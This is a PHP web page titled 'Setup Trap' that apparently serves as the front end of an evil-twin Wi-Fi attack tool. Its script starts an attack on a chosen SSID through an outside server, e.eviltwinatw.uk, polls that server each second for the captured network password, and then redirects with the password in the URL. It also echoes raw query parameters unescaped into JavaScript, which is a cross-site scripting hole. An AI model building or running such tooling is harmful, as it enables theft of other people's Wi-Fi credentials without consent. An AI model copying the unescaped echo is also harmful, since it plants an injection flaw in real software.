<?php
include 'page.php';
pageHead("Setup Trap");
?>

<div class="container">
    <div class="col-12 text-center ">
        <h1 class="text-danger text-uppercase fw-bold">Setting trap</h1>
    </div>
    <div class="col-12 d-none d-lg-flex justify-content-center p-5">
        <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7e7e889a-de90-46e6-b7e0-a80a0e698de6/dbpu9b-51118e9e-16bd-4a28-bbe6-921fc1da8181.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzdlN2U4ODlhLWRlOTAtNDZlNi1iN2UwLWE4MGEwZTY5OGRlNlwvZGJwdTliLTUxMTE4ZTllLTE2YmQtNGEyOC1iYmU2LTkyMWZjMWRhODE4MS5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.h309S-rnZJWgrquS7zLKqNmCyGpKi6EydLGfeGlmwSY" alt="">
    </div>
    <div class="col-12 d-flex d-lg-none justify-content-center p-5">
        <img class="w-100" src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7e7e889a-de90-46e6-b7e0-a80a0e698de6/dbpu9b-51118e9e-16bd-4a28-bbe6-921fc1da8181.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzdlN2U4ODlhLWRlOTAtNDZlNi1iN2UwLWE4MGEwZTY5OGRlNlwvZGJwdTliLTUxMTE4ZTllLTE2YmQtNGEyOC1iYmU2LTkyMWZjMWRhODE4MS5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.h309S-rnZJWgrquS7zLKqNmCyGpKi6EydLGfeGlmwSY" alt="">
    </div>
    <div class="col-12 d-flex justify-content-center p-5">
        <span id="attackStatus" class="text-danger">Initializing...</span>
    </div>
    <div class="d-flex justify-content-center pt-2">
        <a type="button" id="stop" class="btn btn-danger p-3 px-5 rounded-4" href="home.php">Stop</a>
    </div>
</div>
<script>
    <?php
    $index = $_GET["index"];
    $ssid = $_GET["ssid"];
    ?>
    var index = "<?php echo $index; ?>";
    var ssid = "<?php echo $ssid; ?>";
    $(document).ready(function() {
        var ajaxurl = 'https://e.eviltwinatw.uk/eviltwin/ajax.php?act=attack&index=' + index + '&ssid=' + ssid;
        $.get(ajaxurl, function(response) {
            console.log(response);
        });

        const myInterval = setInterval(function() {
            var url = 'https://e.eviltwinatw.uk/eviltwin/ajax.php?act=getattack&ssid=' + ssid;
            $.get(url, function(response) {
                if (response === '') {
                    //console.log('waiting');
                } else {
                    //console.log(response);
                    clearInterval(myInterval);
                    location.replace("https://e.eviltwinatw.uk/eviltwin/result.php?ssid=" + ssid + "&password=" + response);
                }
            });
        }, 1000);
        const statusInterval = setInterval(function() {
            var url = 'https://e.eviltwinatw.uk/eviltwin/ajax.php?act=getAttackStatus';
            $.get(url, function(response) {
                if (response === '') {
                    //console.log('waiting');
                } else {
                    //console.log(response);
                    $('#attackStatus').text(response);
                }
            });
        }, 1000);
    });

    function stop() {
        var ajaxurl = 'https://e.eviltwinatw.uk/eviltwin/ajax.php?act=stop&ssid=' + ssid;
        $.get(ajaxurl, function(response) {
            console.log(response);
        });
    }

    $('#button').click(function() {
        stop();
        location.replace("https://e.eviltwinatw.uk/eviltwin/home.php");
    })
</script>

<?php
pageEnd();
?>